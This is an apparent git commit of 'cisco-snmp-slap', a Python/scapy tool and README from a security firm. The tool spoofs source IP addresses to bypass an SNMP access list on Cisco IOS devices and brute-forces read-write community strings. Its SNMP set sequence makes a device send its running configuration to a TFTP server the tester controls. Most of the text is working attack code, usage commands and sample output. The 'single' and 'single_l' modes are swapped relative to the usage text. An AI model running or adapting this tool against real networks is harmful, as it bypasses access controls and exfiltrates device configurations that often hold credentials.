d30851fc306b8be1a52eb446a64492242c1f870c
Darren McDonald <darren.mcdonald@nccgroup.com>
2014-11-07 14:57:44 +0000

    Initial upload
    Moving from local development to git based initial.

---
+++ README.txt
@@ -0,0 +1,159 @@
+*******************************************************************************
+                                  OVERVIEW
+*******************************************************************************
+cisco-snmp-slap utilises IP address spoofing in order to bypass an ACL
+protecting an SNMP service on a Cisco IOS device.
+
+Typicially IP spoofing has limited use during real attacks outside DoS. Any TCP
+service cannot complete the inital handshake. UDP packets are easier to spoof
+but the return packet is often sent to the wrong address, which makes it 
+difficult to collect any information returned.
+
+However if an attacker can guess the snmp rw community string and a valid source
+address an attacker can set SNMP MiBs. One of the more obvious uses for this
+is to have a Cisco SNMP service send its IOS configuration file to another
+device.
+
+This tool allows you to try one or more community strings against a Cisco device
+from one or more IP addresses. When specifiying IP addresses you can choose to
+sequently or randomly go through a range of source addresses.
+
+To specifying range of source IP addresses to check an initial source address
+and IP mask are supplied. Any bits set in the IP mask will be used to generate
+source IP addresses by altering the inital source address.
+
+For example, if a source address of 10.0.0.0 is supplied with a IP mask of
+0.0.0.255 then the script will explore the address from 10.0.0.0 to 10.0.0.255.
+
+The bits set do not have to be sequental like a subnet mask. For example the
+mask 0.128.1.255 is valid and will explore the ranges 10.0,128.0-1.0-255.
+
+When checking a range of ipaddresses randomly or sequentally it requires you to
+enter the path to the root of the tftp directory. The script will check this
+directory to see if the file has been sucessful transfered.
+
+This tool was written to target Cisco layer 3 switches during pentests, though
+it may have other users. It works well against these devices because:
+
+1) layer 3 switches rarely have reverse path verification configured in the
+author's expirence
+2) there are no routers or other devices which may be able to detect that
+IP spoofing is ocurring.
+
+Though I hope that users will find other interesting uses for this script
+and its source code.
+
+*******************************************************************************
+                                   USAGE 
+*******************************************************************************
+In this example I will take a simple IOS device with an access list
+protecting a SNMP service using the community string 'cisco'
+
+  access-list 10 permit 10.100.100.0 0.0.0.255
+  snmp-server community cisco rw 10
+	
+One IOS device's IP address is 10.0.0.1
+
+The pentester has an IP address 10.0.0.2 and has started a TFTP server.
+
+If the tester knows all of this they use the one shot single mode to
+grab the device's config file. E.g.
+ 
+  ./slap.py single cisco 10.0.0.2 10.100.100.100 10.0.0.1
+	
+If the tester doesnt know the details of they could try and guess.
+Lets say the tester has done some recon and has figured out that 
+all internal addresses are the 10.0.0.0/8 range.
+
+  ./slap.py seqmask private 10.0.0.2 10.0.0.0 0.255.255.0 10.0.0.1 /tftproot/
+  
+This command will search through all the /24, the tester hopes they can
+save some time by assuming a whole subnet will be allowed access rather
+than just one IP address.
+
+  root@Athena:/home/notroot/cisco-snmp-slap# ./slap.py seqmask cisco 10.0.0.2 10.0.0.5 0.255.255.0 10.0.0.1 /tftproot/
+  Cisco SNMP Slap,  v0.3
+  Darren McDonald, darren.mcdonald@nccgroup.com
+
+  WARNING: No route found for IPv6 destination :: (no default route?)
+  Community String:   cisco
+  TFTP Server IP  :   10.0.0.2
+  Source IP:          10.0.0.5
+  Source Mask:        0.255.255.0
+  Destination IP:     10.0.0.1
+  TFTP Root Path:     /tftproot//cisco-config.txt
+  10.0.0.5
+  10.0.1.5
+  10.0.2.5
+  < ... cut for brevity ... >
+  10.100.99.255
+  10.100.100.0
+  10.100.100.1
+  10.100.100.2
+  10.100.100.3
+  10.100.100.4
+  10.100.100.5
+  10.100.100.6
+  Success!
+ 
+You should notice that the program exists and announces success several IP
+addresses after it enters the 10.100.100.0/24 range. This because it is not
+possible to determine which source address was successful, but dermines one
+of the requests was successful after the config file turns up in the tftproot.
+Given you've just nabbed the running config you can now find out the details
+of the ACL yourself.
+
+Rather than specifying a single community string you can also give a list
+which should be used. The mode names are the same execpt have a '_l' suffix.
+
+For example to repeat the same attack using a list of community strings in in
+list.txt the following arguements should be used.
+
+  root@Athena:/home/notroot/cisco-snmp-slap# ./slap.py seqmask_l list.txt 10.0.0.2 10.0.0.5 0.255.255.0 10.0.0.1 /tftproot/
+  Cisco SNMP Slap,  v0.3
+  Darren McDonald, darren.mcdonald@nccgroup.com
+  
+  WARNING: No route found for IPv6 destination :: (no default route?)
+  Community File:     list.txt
+  TFTP Server IP  :   10.0.0.2
+  Source IP:          10.0.0.5
+  Source Mask:        0.255.255.0
+  Destination IP:     10.0.0.1
+  TFTP Root Path:     /tftproot//cisco-config.txt
+  community strings loaded:  ['private\n', 'cisco\n', 'public\n']
+  10.0.0.5 /  private
+  10.0.0.5 /  cisco
+  10.0.0.5 /  public
+  10.0.1.5 /  private
+  10.0.1.5 /  cisco
+  10.0.1.5 /  public
+  10.0.2.5 /  private
+  10.0.2.5 /  cisco
+  10.0.2.5 /  public
+  10.0.3.5 /  private
+  10.0.3.5 /  cisco
+  10.0.3.5 /  public
+
+Now each IP address is checked with each community string in list.txt.
+
+*******************************************************************************
+                                 SUPPORT 
+*******************************************************************************
+
+As programming langauges go Python is a simple langauge, easy to read and write
+and I encourage you to attempt to debug and correct any issues you find and
+send me your changes so I can share them with other users on the NCC Git hub.
+
+But if you need assistance you can contact me at darren.mcdonald@nccgroup.com.
+I'll do my best to help you but you should be aware I am not a full time
+developer (which should be obvious from my code!) and may not immediately have
+time get to your query.
+
+*******************************************************************************
+                                 VERSIONS
+*******************************************************************************
+
+0.1 Inital version, not publically released
+0.2 Added random and sequental modes and source address masks
+0.3 added community string file list feature, first publical version
+
---
+++ slap.py
@@ -0,0 +1,284 @@
+#!/usr/bin/env python
+#    Cisco SNMP Slap v0.3
+#    Released as open source by NCC Group Plc - http://www.nccgroup.com/
+#    Developed by Darren McDonald, darren.mcdonald@nccgroup.com
+#    http://www.github.com/nccgroup/
+
+#    This program is free software: you can redistribute it and/or modify
+#    it under the terms of the GNU Affero General Public License as published by
+#    the Free Software Foundation, either version 3 of the License, or
+#    (at your option) any later version.
+#
+#    This program is distributed in the hope that it will be useful,
+#    but WITHOUT ANY WARRANTY; without even the implied warranty of
+#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#    GNU Affero General Public License for more details.
+#
+#    You should have received a copy of the GNU Affero General Public License
+#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
+
+# TODO
+# * Multi threading
+# * Comments
+
+version = "v0.3"
+
+print "Cisco SNMP Slap, ", version
+print "Darren McDonald, darren.mcdonald@nccgroup.com"
+
+import sys
+from scapy.all import *
+import random
+import os.path
+import re
+
+community = ""
+tftpserver = ""
+srcip = ""
+dstip = ""
+srcmask = ""
+outpath = ""
+configured = 0
+
+def sendSNMP( l, c ):
+	s1=SNMP(community=c,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.96.1.1.1.1.14.112"),value=6)])) 
+	s2=SNMP(community=c,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.96.1.1.1.1.2.112"),value=1)])) 
+	s3=SNMP(community=c,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.96.1.1.1.1.3.112"),value=4)])) 
+	s4=SNMP(community=c,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.96.1.1.1.1.4.112"),value=1)])) 
+	s5=SNMP(community=c,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.96.1.1.1.1.5.112"),value=ASN1_IPADDRESS(tftpserver))]))
+	s6=SNMP(community=c,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.96.1.1.1.1.6.112"),value="cisco-config.txt")])) 
+	s7=SNMP(community=c,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.96.1.1.1.1.14.112"),value=1)])) 
+	send(l/s1, verbose=0)
+	send(l/s2, verbose=0)
+	send(l/s3, verbose=0)
+	send(l/s4, verbose=0)
+	send(l/s5, verbose=0)
+	send(l/s6, verbose=0)
+	send(l/s7, verbose=0)
+
+def checkFile():
+	if os.path.isfile(outpath) == True:
+		print "Success!"
+		quit()
+
+def myQuit():
+	print "waiting 10 seconds to see of the last requests cause a TFTP push"
+	sleep(10)
+	checkFile()
+	quit()
+
+argc = len(sys.argv)
+
+if argc > 1:
+	mode = sys.argv[1]
+
+if argc == 6 and mode == "single":
+	print "Community file:  ", sys.argv[2]
+	filename = sys.argv[2]
+	print "TFTP Server IP  :  ", sys.argv[3]
+	tftpserver = sys.argv[3]
+	print "Source IP:         ", sys.argv[4]
+	srcip = sys.argv[4]
+	print "Destination IP:    ", sys.argv[5]
+	dstip = sys.argv[5]
+	configured = 1
+	with open( filename ) as infile:
+		community = infile.readlines()
+	print "community strings loaded: ", community
+
+
+if argc == 6 and mode == "single_l":
+	print "Community String:  ", sys.argv[2]
+	community = sys.argv[2]
+	print "TFTP Server IP  :  ", sys.argv[3]
+	tftpserver = sys.argv[3]
+	print "Source IP:         ", sys.argv[4]
+	srcip = sys.argv[4]
+	print "Destination IP:    ", sys.argv[5]
+	dstip = sys.argv[5]
+	configured = 1
+
+if argc == 8 and mode == "randmask":
+	print "Community String:  ", sys.argv[2]
+	community = sys.argv[2]
+	print "TFTP Server IP  :  ", sys.argv[3]
+	tftpserver = sys.argv[3]
+	print "Source IP:         ", sys.argv[4]
+	srcip = sys.argv[4]
+	print "Source Mask:       ", sys.argv[5]
+	srcmask = sys.argv[5]
+	print "Destination IP:    ", sys.argv[6]
+	dstip = sys.argv[6]
+	outpath = sys.argv[7] + "/cisco-config.txt"
+	print "TFTP Root Path:    ", outpath
+	configured = 1
+
+if argc == 8 and mode == "seqmask":
+	print "Community String:  ", sys.argv[2]
+	community = sys.argv[2]
+	print "TFTP Server IP  :  ", sys.argv[3]
+	tftpserver = sys.argv[3]
+	print "Source IP:         ", sys.argv[4]
+	srcip = sys.argv[4]
+	print "Source Mask:       ", sys.argv[5]
+	srcmask = sys.argv[5]
+	print "Destination IP:    ", sys.argv[6]
+	dstip = sys.argv[6]
+	outpath = sys.argv[7] + "/cisco-config.txt"
+	print "TFTP Root Path:    ", outpath
+	configured = 1
+
+
+if argc == 8 and mode == "seqmask_l":
+	print "Community File:    ", sys.argv[2]
+	filename = sys.argv[2]
+	print "TFTP Server IP  :  ", sys.argv[3]
+	tftpserver = sys.argv[3]
+	print "Source IP:         ", sys.argv[4]
+	srcip = sys.argv[4]
+	print "Source Mask:       ", sys.argv[5]
+	srcmask = sys.argv[5]
+	print "Destination IP:    ", sys.argv[6]
+	dstip = sys.argv[6]
+	outpath = sys.argv[7] + "/cisco-config.txt"
+	print "TFTP Root Path:    ", outpath
+	configured = 1
+	with open( filename ) as infile:
+		community = infile.readlines()
+	print "community strings loaded: ", community
+
+if argc == 8 and mode == "randmask_l":
+	print "Community File:    ", sys.argv[2]
+	filename = sys.argv[2]
+	print "TFTP Server IP  :  ", sys.argv[3]
+	tftpserver = sys.argv[3]
+	print "Source IP:         ", sys.argv[4]
+	srcip = sys.argv[4]
+	print "Source Mask:       ", sys.argv[5]
+	srcmask = sys.argv[5]
+	print "Destination IP:    ", sys.argv[6]
+	dstip = sys.argv[6]
+	outpath = sys.argv[7] + "/cisco-config.txt"
+	print "TFTP Root Path:    ", outpath
+	configured = 1
+	with open( filename ) as infile:
+		community = infile.readlines()
+	print "community strings loaded: ", community
+
+if configured == 0:
+	print "Usage: ./slap.py single [community string] [TFTP Server IP] [Source IP] [Destination IP]"
+	print "       ./slap.py single_l [community string file] [TFTP Server IP] [Source IP] [Destination IP]"
+	print "       ./slap.py randmask [community string] [TFTP Server IP] [Source IP] [sourcemask] [Destination IP] [TFTP Root Path]"
+	print "       ./slap.py seqmask [community string] [TFTP Server IP] [Source IP] [sourcemask] [Destination IP] [TFTP Root Path]"
+	print "       ./slap.py randmask_l [community string file] [TFTP Server IP] [Source IP] [sourcemask] [Destination IP] [TFTP Root Path]"
+	print "       ./slap.py seqmask_l [community string file] [TFTP Server IP] [Source IP] [sourcemask] [Destination IP] [TFTP Root Path]"
+	print "Examples:"
+	print "       ./slap.py single private 10.0.0.2 10.100.100.100 10.0.0.1"
+	print "       ./slap.py randmask private 10.0.0.2 10.0.0.0 0.255.255.0 10.0.0.1 /tftproot/"
+	print "       ./slap.py seqmask private 10.0.0.2 10.0.0.0 0.255.255.0 10.0.0.1 /tftproot/"
+	print "       ./slap.py seqmask_l mylist.txt 10.0.0.2 10.0.0.0 0.255.255.0 10.0.0.1 /tftproot/"
+	print ""
+	print "All of these examples would work against a device expecting an IP address in the 10.100.100.0/24"
+	print "range with a tftp server running on 10.0.0.2, against a target 10.0.0.1"
+	print ""
+	print "This tool does not include an TFTP server, you'll have to run one seperatly, e.g. tftpgui.py"
+
+	quit()
+
+if outpath != "" and os.path.isfile(outpath):
+	print "Target file alreadly exists, delete or move the following file and try again"
+	print outpath
+	quit()
+
+if mode == "single":
+	l34=IP(src=srcip,dst=dstip)/UDP(sport=161,dport=161)
+	sendSNMP( l34, community )
+	quit()
+
+if mode == "single_l":
+	l34=IP(src=srcip,dst=dstip)/UDP(sport=161,dport=161)
+	for c in community:
+		sendSNMP( l34, c )
+		checkFile()
+	quit()
+	
+if mode == "randmask":
+	while True:
+		tmpip = srcip
+                srcIPAsLong = struct.unpack("!L", socket.inet_aton(tmpip))[0]
+                maskAsLong = struct.unpack("!L", socket.inet_aton(srcmask))[0]
+		randIP = ".".join(map(str, (random.randint(0, 255)
+			for _ in range(4))))
+		randomLong = struct.unpack("!L", socket.inet_aton(randIP))[0]
+		maskAsLong = randomLong & maskAsLong
+		srcIPAsLong = srcIPAsLong ^ maskAsLong
+		tmpip = socket.inet_ntoa(struct.pack('!L', srcIPAsLong))
+		print tmpip
+		l34=IP(src=tmpip,dst=dstip)/UDP(sport=161,dport=161)
+		sendSNMP( l34, community )
+		checkFile()
+
+if mode == "randmask_l":
+	while True:
+		tmpip = srcip
+                srcIPAsLong = struct.unpack("!L", socket.inet_aton(tmpip))[0]
+                maskAsLong = struct.unpack("!L", socket.inet_aton(srcmask))[0]
+		randIP = ".".join(map(str, (random.randint(0, 255)
+			for _ in range(4))))
+		randomLong = struct.unpack("!L", socket.inet_aton(randIP))[0]
+		maskAsLong = randomLong & maskAsLong
+		srcIPAsLong = srcIPAsLong ^ maskAsLong
+		tmpip = socket.inet_ntoa(struct.pack('!L', srcIPAsLong))
+		l34=IP(src=tmpip,dst=dstip)/UDP(sport=161,dport=161)
+		for c in community:
+			c = c.strip()
+			print tmpip, "/ ", c
+			sendSNMP(l34, c)
+			checkFile()
+
+if mode == "seqmask":
+	seqIP = "0.0.0.0"
+	seqLong = struct.unpack("!L", socket.inet_aton(seqIP))[0]
+	tmpip = srcip
+        srcIPAsLong = struct.unpack("!L", socket.inet_aton(tmpip))[0]
+        maskAsLong = struct.unpack("!L", socket.inet_aton(srcmask))[0]
+	while True:
+		if seqLong | maskAsLong == maskAsLong:
+			srcIPAsLong2 = srcIPAsLong ^ seqLong
+			tmpip = socket.inet_ntoa(struct.pack('!L', srcIPAsLong2))
+			print tmpip
+			l34=IP(src=tmpip,dst=dstip)/UDP(sport=161,dport=161)
+			sendSNMP(l34, community)
+			checkFile()
+		if seqLong < maskAsLong:
+			seqLong = seqLong + 1
+		else:
+			break
+	checkFile()
+	myQuit()
+
+if mode == "seqmask_l":
+	seqIP = "0.0.0.0"
+	seqLong = struct.unpack("!L", socket.inet_aton(seqIP))[0]
+	tmpip = srcip
+        srcIPAsLong = struct.unpack("!L", socket.inet_aton(tmpip))[0]
+        maskAsLong = struct.unpack("!L", socket.inet_aton(srcmask))[0]
+	while True:
+		if seqLong | maskAsLong == maskAsLong:
+			srcIPAsLong2 = srcIPAsLong ^ seqLong
+			tmpip = socket.inet_ntoa(struct.pack('!L', srcIPAsLong2))
+			l34=IP(src=tmpip,dst=dstip)/UDP(sport=161,dport=161)
+			for c in community:
+				c = c.strip()
+				print tmpip, "/ ", c
+				sendSNMP(l34, c)
+				checkFile()
+		if seqLong < maskAsLong:
+			seqLong = seqLong + 1
+		else:
+			break
+	checkFile()
+	myQuit()
+
+quit()
+
